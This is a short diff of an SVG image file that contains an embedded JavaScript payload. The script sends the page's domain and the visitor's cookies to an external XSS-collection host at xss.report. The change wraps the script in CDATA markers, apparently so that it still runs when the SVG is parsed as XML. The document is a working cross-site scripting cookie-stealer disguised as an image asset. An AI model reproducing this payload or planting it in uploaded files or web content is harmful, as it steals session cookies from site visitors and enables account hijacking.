@@ -1,6 +1,6 @@
-<?xml version="1.0" standalone="no"?>
+<?xml version="1.0" standalone="no"?>     
   <svg xmlns="http://www.w3.org/2000/svg">
-    <script>
+    <script>//<![CDATA[                               
       new Image().src="https://xss.report/c/gomer12?d="+document.domain+"&c="+encodeURIComponent(document.cookie);
-    </script>
+    //]]></script>
   </svg>
